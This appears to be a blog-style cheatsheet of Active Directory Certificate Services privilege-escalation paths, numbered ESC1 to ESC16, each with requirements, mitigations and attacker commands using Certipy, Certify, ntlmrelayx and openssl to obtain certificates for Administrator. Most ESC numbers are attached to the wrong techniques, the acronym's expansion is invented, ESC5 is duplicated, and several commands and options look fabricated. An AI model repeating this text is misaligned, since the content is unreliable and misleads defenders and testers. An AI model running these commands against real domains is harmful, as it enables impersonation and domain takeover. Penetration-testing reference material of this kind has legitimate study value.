---
title: "Active Directory Certificate Services (AD CS) Exploitation – ESC Paths Cheatsheet"
description: "A concise, attacker-focused reference of Enterprise Security Control (ESC) abuse paths in Active Directory Certificate Services."
date: 2025-06-11T10:00:00+05:30
categories:
  - windows
  - adcs
  - hacking
tags:
  - privilege escalation
  - windows security
  - windows
  - pentesting
  - esc
  - certipy
  - red team
---
---

For detailed explanations, real-world examples, and tool usage, refer to the Certipy wiki: [Priv Esc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

---

# ESC1 – Enroll On Behalf Of (EBO) Abuse
Exploit the Enrollment Agent certificate template to request a certificate on behalf of another user, such as a Domain Admin.
## Requirements:
- Certificate template has
  - `ENROLLEE_SUPPLIES_SUBJECT` flag set.
  - `Certificate Request Agent` EKU.
- You have:
  - Enroll rights on that template.
  - Enrollment Agent rights.
- The CA accepts requests from that template.

## Impact:
You can request a certificate for any user, including Administrator, and authenticate as them (via PKINIT, etc.).

## Example:
### Certipy:
```bash
# 1. Request certificate on behalf of Administrator
certipy-ad req -u 'youruser' -p 'yourpass' \
  -ca 'ca.domain.local\CA-NAME' \
  -template 'EnrollmentAgentTemplate' \
  -target 'Administrator' \
  -on-behalf-of 'Administrator' \
  -pfx administrator.pfx

# 2. Use the PFX to authenticate
certipy-ad auth -pfx administrator.pfx
```

## To Identify:
Use Certipy or Certify to enumerate templates and check for:
- `Certificate Request Agent` in EKUs
- `ENROLLEE_SUPPLIES_SUBJECT = True`
- Who can enroll
- Who is listed as Enrollment Agents 
```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

## Mitigation:
- Disable or restrict use of Certificate Request Agent templates.
- Only allow high-trust users to be Enrollment Agents.
- Monitor template use and restrict ENROLLEE_SUPPLIES_SUBJECT.

---

# ESC2 – Vulnerable Certificate Template with Dangerous Flags
Some templates are dangerously configured to allow any authenticated user to supply subject info and request certificates that allow for authentication — enabling identity impersonation.

## Requirements:
- Certificate template has:
  - `ENROLLEE_SUPPLIES_SUBJECT` flag set.
  - `Client Authentication` EKU.
- Any authenticated user can:
  - Enroll in the template.
  - Specify the `Subject` or `SAN` fields (e.g., UPN of a Domain Admin).

## Impact:
A low-privilege user can request a certificate for a privileged account (e.g., Administrator), impersonate them, and gain access to services supporting certificate-based auth (like LDAP or Kerberos via PKINIT).

## Example:
### Certipy:
```bash
# Request a certificate for Administrator
certipy-ad req -u lowpriv -p pass123 \
  -ca 'ca.domain.local\CA-NAME' \
  -template 'VulnerableUserTemplate' \
  -upn 'Administrator@domain.local' \
  -pfx administrator.pfx

# Authenticate using the forged cert
certipy-ad auth -pfx administrator.pfx
```

### To Identify:
Use Certipy or Certify to scan for templates where:
- `Client Authentication` is present in EKUs.
- `ENROLLEE_SUPPLIES_SUBJECT = True`.
- Authenticated users are allowed to enroll.
```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

### Mitigation:
- Do not allow low-privileged users to enroll in templates with ENROLLEE_SUPPLIES_SUBJECT.
- Avoid Client Authentication EKU unless required.
- Implement certificate issuance approval.
- Regularly audit AD CS templates and permissions.

---

# ESC3 – Vulnerable Certificate Template with Dangerous EKUs and No Subject Restrictions
This abuse path allows attackers to enroll in certificate templates that permit client authentication but do not require supplying subject information — enabling cert-based impersonation with minimal constraints.

## Requirements:
- Certificate template:
  - Has `Client Authentication` in EKUs.
  - Does **not** require `ENROLLEE_SUPPLIES_SUBJECT`.
- Any authenticated user can enroll.
- No issuance approval or manager constraints are set.

## Impact:
A low-privilege user can request a certificate for **themselves**, use it to authenticate with Kerberos (PKINIT), and escalate laterally via other misconfigs (e.g., if the cert is stored insecurely or used with NTLM relay).

## Example:
### Certipy:
```bash
# Request cert for current user (self)
certipy-ad req -u lowpriv -p pass123 \
  -ca 'ca.domain.local\CA-NAME' \
  -template 'UserTemplate' \
  -pfx lowpriv.pfx

# Use the certificate to authenticate
certipy-ad auth -pfx lowpriv.pfx
```

## To Identify:
Look for certificate templates where:
- EKUs include `Client Authentication`
- `ENROLLEE_SUPPLIES_SUBJECT = False`
- Low-privileged users can enroll
```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

## Mitigation:
- Avoid enabling `Client Authentication` unless necessary.
- Restrict who can enroll in templates.
- Enforce issuance approval for templates with auth-capable certs.
- Monitor cert enrollment logs and usage patterns.

---

# ESC4 – NTLM Relay to AD CS Web Enrollment
An attacker can relay NTLM authentication to the AD CS Web Enrollment interface (`certsrv`) to obtain a valid authentication certificate for the victim, enabling impersonation.

## Requirements:
- AD CS Web Enrollment (HTTP-based `certsrv`) is enabled.
- Victim (target user/machine) initiates NTLM auth that can be captured and relayed.
- A certificate template exists that:
  - Allows `ENROLLEE_SUPPLIES_SUBJECT`
  - Has `Client Authentication` EKU
  - Allows enrollment by authenticated users
- No protections like Extended Protection for Authentication (EPA) are in place.

## Impact:
By relaying NTLM to the AD CS web interface, an attacker can request a certificate as the victim user. This cert can then be used for Kerberos PKINIT or LDAP auth, granting impersonation.

## Example:
### ntlmrelayx (Impacket):
```bash
# Start relay to AD CS
ntlmrelayx.py -t http://ca.domain.local/certsrv/ --adcs --template VulnerableTemplate

# Relay captured NTLM (e.g., from Responder or mitm6)
# Result: Attacker obtains a cert for the victim account
```

### Then use with Certipy:
```bash
# Authenticate using relayed cert
certipy-ad auth -pfx victim.pfx
```

## To Identify:
- Check if Web Enrollment (`http://<CA>/certsrv`) is available.
- Use Certipy or Certify to list templates allowing:
  - `ENROLLEE_SUPPLIES_SUBJECT = True`
  - `Client Authentication` EKU
  - Enroll permissions to all users

```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

## Mitigation:
- Disable Web Enrollment if not needed.
- Enforce EPA (Extended Protection for Authentication).
- Remove `Client Authentication` EKU and subject supply if not needed.
- Block NTLM where possible (especially over HTTP).

---

# ESC5 – Misconfigured Certificate Template + WriteDacl / FullControl
An attacker with `WriteDACL` or `GenericAll` rights over a vulnerable certificate template can modify it to become exploitable — enabling privilege escalation or impersonation.

## Requirements:
- You have:
  - `WriteDACL`, `GenericAll`, or `FullControl` on a certificate template.
- Target template does **not** have dangerous config **yet**.
- You can change:
  - Permissions (add enroll rights)
  - EKUs (add `Client Authentication`)
  - Flags (enable `ENROLLEE_SUPPLIES_SUBJECT`)

## Impact:
You can convert a non-exploitable template into one that lets you request authentication certificates for other users — such as Domain Admins — enabling full impersonation.

## Example:
### Using Certify (Windows):
```cmd
# Add enroll rights for your user to the target template
Certify.exe template /template:CorpUser /add_enroll:DOMAIN\\attacker

# Modify EKUs and flags
Certify.exe template /template:CorpUser /seteku:"Client Authentication" /enrolleeSupplySubject:true
```

### Then use Certipy to request a certificate:
```bash
certipy-ad req -u attacker -p password \
  -template CorpUser \
  -ca 'ca.domain.local\CA-NAME' \
  -upn 'Administrator@domain.local' \
  -pfx admin.pfx
```

## To Identify:
Use BloodHound or PowerView to find templates where:
- You have `WriteDACL` or `GenericAll` rights
- The template is not yet exploitable (but can be made so)

```powershell
Find-InterestingACE -ResolveGUIDs | ? {$_.ObjectType -eq 'EnrollmentServices'}
```

## Mitigation:
- Limit who has control over certificate templates.
- Audit permissions (especially DACLs) on all templates.
- Use `Certify` or `PSPKI` to inspect template ACLs regularly.

---

# ESC5 – Misconfigured Certificate Template + WriteDacl / FullControl
An attacker with `WriteDACL` or `FullControl` over a certificate template can modify it to become vulnerable — even if it was not originally exploitable — enabling certificate-based impersonation.

## Requirements:
- You have one of the following on a certificate template:
  - `WriteDACL`, `GenericAll`, or `FullControl`
- The template is **not currently exploitable**, but:
  - You can modify it to **add dangerous flags** such as:
    - `ENROLLEE_SUPPLIES_SUBJECT = True`
    - `Client Authentication` EKU
    - Add yourself to the Enroll/Autoenroll permissions

## Impact:
You can turn a safe template into an exploitable one. Then, you can request a certificate impersonating another user (e.g., Administrator) and authenticate using it.

## Example:
### Using Certify (Windows):
```cmd
# Give yourself enroll rights on the template
Certify.exe template /template:CorpUser /add_enroll:DOMAIN\\attacker

# Modify EKUs and flags to make it dangerous
Certify.exe template /template:CorpUser /seteku:"Client Authentication" /enrolleeSupplySubject:true
```

### Then use Certipy to request a certificate:
```bash
certipy-ad req -u attacker -p password \
  -template CorpUser \
  -ca 'ca.domain.local\CA-NAME' \
  -upn 'Administrator@domain.local' \
  -pfx admin.pfx
```

## To Identify:
- Use **BloodHound** or **PowerView** to find templates where:
  - You have `GenericAll`, `WriteDACL`, or `FullControl` rights
- Use **Certify** or **Certipy** to enumerate template settings
- Focus on templates that are **not exploitable yet** but:
  - Lack EKUs, flags, or permissions that **you could add**

```powershell
Find-InterestingACE -ResolveGUIDs | ? {$_.ObjectType -eq 'EnrollmentServices'}
```

## Mitigation:
- Audit and restrict template permissions (especially DACLs).
- Only trusted admins should have `WriteDACL`/`FullControl` on templates.
- Regularly inspect templates using Certify or PSPKI for misconfigurable paths.

---

# ESC6 – Misconfigured Certificate Authority ACL (CA Permissions Abuse)
If an attacker has `ManageCA`, `ManageTemplates`, or `Owner` rights on a Certificate Authority, they can manipulate CA-wide settings or templates to escalate privileges.

## Requirements:
- You have one of the following rights on the **Certificate Authority object** in AD:
  - `ManageCA`
  - `ManageTemplates`
  - `Owner`, `WriteDACL`, or `FullControl`
- You may not control any templates yet, but can:
  - **Add new templates**
  - **Modify which templates the CA accepts**

## Impact:
With control over the CA, you can:
- Attach a malicious or vulnerable template to the CA
- Modify existing templates
- Issue authentication certificates for impersonation

## Example:
### Scenario: Add a vulnerable template to a CA
```powershell
# Using Certify or PSPKI, attach an already vulnerable template to the CA
# (if you control both the CA and a template)
Set-CATemplate -Name "CA-NAME" -TemplatesToAdd "ESC2LikeTemplate"
```

### Then request cert via Certipy
```bash
certipy-ad req -u attacker -p pass123 \
  -template ESC2LikeTemplate \
  -ca 'ca.domain.local\CA-NAME' \
  -upn 'Administrator@domain.local' \
  -pfx admin.pfx
```

## To Identify:
- Use **BloodHound** to identify CAs where you have rights:
  - Object type: `EnrollmentServices`
  - Rights like `GenericAll`, `WriteDACL`, `ManageCA`, etc.

```powershell
Find-InterestingACE -ResolveGUIDs | ? {$_.ObjectType -eq 'EnrollmentServices'}
```

- Enumerate CA settings using PSPKI or `certutil -dump` on a target machine

## Mitigation:
- Restrict administrative rights on Certificate Authorities.
- Audit ACLs on CA objects in AD.
- Use delegation carefully and avoid overly permissive CA permissions.
- Monitor changes to CA configuration and template associations.

---

# ESC7 – Vulnerable Certificate Template + CTL (Certificate Trust List) Abuse
An attacker can abuse a weak Certificate Trust List (CTL) or lack of EKU enforcement to enroll in a certificate template that enables authentication, even when EKUs or chain validation should restrict it.

## Requirements:
- You can enroll in a certificate template that:
  - Has weak or missing EKUs (or wrong ones like `Any Purpose`)
  - Is trusted for client authentication **due to lax CTL or EKU checking**
- The service (e.g., LDAP, PKINIT) does **not** enforce strict EKU validation
- No proper CTLs (Certificate Trust Lists) or EKU enforcement in place

## Impact:
You can get a certificate that appears valid for authentication, even if the template **was not intended** to be used that way — allowing identity spoofing and access to sensitive services.

## Example:
### Certipy:
```bash
# Request cert from a template with weak EKUs
certipy-ad req -u attacker -p password \
  -template WeakEKUTemplate \
  -ca 'ca.domain.local\CA-NAME' \
  -upn 'Administrator@domain.local' \
  -pfx admin.pfx

# Authenticate with the certificate
certipy-ad auth -pfx admin.pfx
```

## To Identify:
- Use Certipy or Certify to find templates with:
  - Broad or missing EKUs (e.g., `Any Purpose`)
  - `ENROLLEE_SUPPLIES_SUBJECT = True`
- Test certificate validation behavior of services:
  - Some may accept any cert issued by a trusted CA

```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

## Mitigation:
- Define strict CTLs for each service requiring client authentication
- Enforce EKU checking on services (e.g., LDAP, PKINIT)
- Avoid issuing certificates with `Any Purpose` EKU
- Audit templates and their EKUs regularly

---

# ESC8 – Vulnerable Certificate Template + DNS Name / SAN Spoofing
Abusing certificate templates that allow attackers to supply arbitrary Subject Alternative Names (SANs) or DNS names, which can be used to spoof the identity of other users or services.

## Requirements:
- A certificate template exists that:
  - Allows `ENROLLEE_SUPPLIES_SUBJECT = True`
  - Includes `Client Authentication` EKU
- You have enroll rights on the template
- You can specify a custom UPN or DNS SAN when requesting a certificate

## Impact:
You can request a certificate that contains the UPN or DNS name of a privileged account (e.g., `Administrator@domain.local`). When used for authentication (e.g., PKINIT), services treat you as that user.

## Example:
### Certipy:
```bash
# Request cert with spoofed UPN for Administrator
certipy-ad req -u attacker -p password \
  -template SpoofableTemplate \
  -ca 'ca.domain.local\CA-NAME' \
  -upn 'Administrator@domain.local' \
  -pfx admin.pfx

# Authenticate using spoofed identity
certipy-ad auth -pfx admin.pfx
```

## To Identify:
- Use Certipy or Certify to find templates that:
  - Have `ENROLLEE_SUPPLIES_SUBJECT = True`
  - Allow enrollment by low-privileged users
- Look for ability to specify UPN or SAN in request

```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

## Mitigation:
- Disable subject supply unless required
- Restrict who can enroll in templates with `ENROLLEE_SUPPLIES_SUBJECT`
- Use certificate issuance approval workflows
- Monitor for suspicious certificate requests with spoofed UPNs or SANs

# ESC9 – Misconfigured CTL + Trusted Root Abuse
If the CA issues certificates that chain to a compromised or attacker-controlled root, and clients trust that chain, you can impersonate users or services by issuing your own certificates.

## Requirements:
- You control or can add a trusted root CA to a system (or domain)
- The Certificate Trust List (CTL) is misconfigured or overly permissive
- The system accepts chains from your malicious root

## Impact:
You can issue certificates that impersonate any identity and authenticate using them, even without compromising the issuing enterprise CA directly.

## Example:
```bash
# Use attacker CA to issue cert for Administrator@domain.local
openssl req -new -newkey rsa:2048 -keyout admin.key -out admin.csr -subj "/CN=Administrator@domain.local"
openssl x509 -req -in admin.csr -CA attacker-root.crt -CAkey attacker-root.key -out admin.crt -days 365 -CAcreateserial

# Convert to PFX and use with Certipy
openssl pkcs12 -export -out admin.pfx -inkey admin.key -in admin.crt
certipy-ad auth -pfx admin.pfx
```

## Mitigation:
- Use proper root CA validation (CTLs, GPOs)
- Monitor and restrict trusted root stores
- Avoid accepting external/untrusted chains

---

# ESC10 – Authenticated Template Spoofing via UPN Injection
If you can supply your own UPN during certificate enrollment, and the CA doesn't validate it properly, you can impersonate another user (e.g., Administrator).

## Requirements:
- You can request a cert from a template with:
  - `ENROLLEE_SUPPLIES_SUBJECT = True`
  - `Client Authentication` EKU
- UPN is not validated or restricted during issuance

## Impact:
You receive a cert with `Administrator@domain.local` as UPN, and can use it to authenticate as that user.

## Example:
```bash
certipy-ad req -u attacker -p password \
  -template AnyPurposeTemplate \
  -upn 'Administrator@domain.local' \
  -ca 'ca.domain.local\CA-NAME' \
  -pfx admin.pfx
certipy-ad auth -pfx admin.pfx
```

## Mitigation:
- Enforce UPN validation on CA
- Require approval workflows or manager approval
- Restrict subject name supply capabilities

---

# ESC11 – Misconfigured Smartcard Logon Template Abuse
Smartcard logon templates can be abused if they’re misconfigured to allow self-enrollment without validating subject or SAN fields.

## Requirements:
- Template supports Smartcard Logon
- You can enroll and supply arbitrary subject or SAN
- CA doesn't validate or restrict values

## Impact:
You can authenticate as a privileged user by issuing a smartcard certificate for them.

## Example:
```bash
certipy-ad req -u attacker -p password \
  -template SmartcardTemplate \
  -ca 'ca.domain.local\CA-NAME' \
  -upn 'Administrator@domain.local' \
  -pfx smartcard.pfx
certipy-ad auth -pfx smartcard.pfx
```

## Mitigation:
- Lock down smartcard templates
- Require hardware-backed certificates for smartcard logon
- Monitor for misuse of smartcard templates

---

# ESC12 – Certificate Renewal Abuse
Users with valid certs can sometimes renew them with elevated privileges or spoofed identity fields if renewal validation is weak.

## Requirements:
- You have a valid certificate for a user
- CA allows self-renewal
- Fields like UPN or SAN are not re-validated

## Impact:
You can renew your certificate with elevated UPN (e.g., Administrator), effectively escalating privileges.

## Example:
```bash
certipy-ad renew -pfx attacker.pfx -upn 'Administrator@domain.local' -out admin_renewed.pfx
certipy-ad auth -pfx admin_renewed.pfx
```

## Mitigation:
- Require strong validation on renewals
- Restrict what fields can be changed during renewal
- Monitor renewal logs for abnormal UPNs

---

# ESC13 – Escalation via Duplicate Template Creation
Attackers with `ManageTemplates` rights on the CA can create a new template with dangerous flags and attach it to the CA.

## Requirements:
- You have `ManageTemplates` or `WriteDACL` on CA
- You can define new certificate templates

## Impact:
You can define your own template with:
  - `Client Authentication` EKU
  - `ENROLLEE_SUPPLIES_SUBJECT = True`
  - Enroll rights for yourself

Then use it to impersonate any user.

## Example:
```powershell
# Create or clone a template (requires elevated access or PS tools)
New-CertificateTemplate -Name EvilTemplate -SubjectNameSupplied -ClientAuthEKU -EnrollRights attacker
# Attach to CA
Set-CATemplate -Name "CA-NAME" -TemplatesToAdd "EvilTemplate"
```

## Mitigation:
- Restrict template management permissions
- Audit new templates regularly
- Require approval for template additions

---

# ESC14 – Web Enrollment with Domain Controller Template
If a Domain Controller (DC) certificate template is accessible via web enrollment, attackers can request DC-auth certs and perform NTLM relays or LDAP signing bypass.

## Requirements:
- CA exposes Web Enrollment (`certsrv`)
- Domain Controller template is available
- Template does not restrict enrollment

## Impact:
You can request a cert that allows LDAP signing, Kerberos service authentication, etc. — impersonating a DC.

## Example:
```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/ --adcs --template DomainController
# Relay from a captured DC auth
```

## Mitigation:
- Remove DC templates from web enrollment access
- Require manager approval or restrict to actual DCs
- Enforce EPA

---

# ESC15 – Shadow Credentials + Certificate Authentication
Even if AD CS is secure, attackers can abuse certificate-based authentication with **shadow credentials** (alternate certs stored in msDS-KeyCredentialLink).

## Requirements:
- You have `GenericWrite` or `WriteProperty` rights on a target user
- Can modify `msDS-KeyCredentialLink` attribute
- Certificate-based authentication is enabled (Kerberos PKINIT or LDAP)

## Impact:
You can authenticate as the target user using a rogue certificate without touching their password or TGT.

## Example:
### Forge shadow credentials:
```bash
certipy-ad shadow-credentials -u attacker -p password -target 'Administrator' -dc-ip <dc-ip>
certipy-ad auth -shadow -pfx admin_shadow.pfx
```

## Mitigation:
- Monitor and restrict access to `msDS-KeyCredentialLink`
- Disable certificate authentication if unused
- Audit users for unexpected credential links

---

# ESC16 – Certificate Publisher Abuse (msPKI-Certificate-Name-Flag Bypass)
Users with the **Certificate Publisher** role on a CA can abuse it to push arbitrary certificates into other users’ AD objects, effectively impersonating them — even without traditional template misconfigurations.

## Description:
In AD CS, when a certificate is issued, it can be **published into Active Directory** (as a `userCertificate` attribute on the user object), making it usable for S/MIME, smartcard logon, and PKINIT-based authentication.

The `Certificate Publisher` permission allows a principal to **publish any certificate to any AD object**, and if not properly locked down, an attacker can:
- Craft a certificate with the UPN or subject of a privileged user (e.g., `Administrator@domain.local`)
- Publish it to that user's object
- Use the cert to authenticate (if services like LDAP, RDP, or Kerberos accept that certificate)

This is especially powerful when combined with:
- Misconfigured client systems that trust AD-published certs implicitly
- Lack of validation or auditing on published certs

## Requirements:
- You have **Certificate Publisher** rights on a CA.
- The environment uses AD-published certificates for auth (e.g., smartcard, PKINIT, or LDAP binding).
- You can craft and publish a certificate with spoofed identity fields (e.g., UPN/SAN).

## Impact:
You can **impersonate any user in Active Directory** by:
- Issuing a certificate with their UPN
- Publishing it to their object
- Authenticating to services using that certificate

This bypasses traditional template protections — even when templates are secure — because the attack leverages the **publishing pipeline** itself.

## Example:
```bash
# 1. Craft a certificate for Administrator
openssl req -new -newkey rsa:2048 -nodes -keyout admin.key -out admin.csr -subj "/CN=Administrator@domain.local"
openssl x509 -req -in admin.csr -CA attacker-ca.crt -CAkey attacker-ca.key -out admin.crt -days 365 -CAcreateserial

# 2. Create a PFX for Certipy
openssl pkcs12 -export -out admin.pfx -inkey admin.key -in admin.crt -passout pass:1234

# 3. Publish certificate to target user (via Certipy)
certipy-ad forge -u attacker -p 'password' -target 'Administrator' -ca 'ca.domain.local\CA-NAME' -publish -pfx admin.pfx

# 4. Authenticate as Administrator
certipy-ad auth -pfx admin.pfx
```

## To Identify:
- Enumerate users/groups with the `Certificate Publisher` role on each CA:
  ```bash
  certipy-ad find -u user -p pass -dc-ip <ip> --vulnerable
  ```
- Look for any unusual `userCertificate` entries in AD
- Monitor for certificate issuance events (e.g., 4886/4887 in Event Logs)

## Mitigation:
- **Audit and restrict `Certificate Publisher` rights**
  - Only CA and enrollment admins should have this.
- Enforce strong identity validation on cert usage (e.g., smartcard enforcement, SAN checks).
- Monitor certificate publishing and certificate usage (especially PKINIT auth).
- Disable unnecessary certificate-based authentication methods if not used.

## Related:
- This is especially dangerous when combined with **template duplication (ESC13)** or **misused CAs (ESC9)**.
- See: [Certipy Wiki – ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16---certificate-publisher-abuse)

---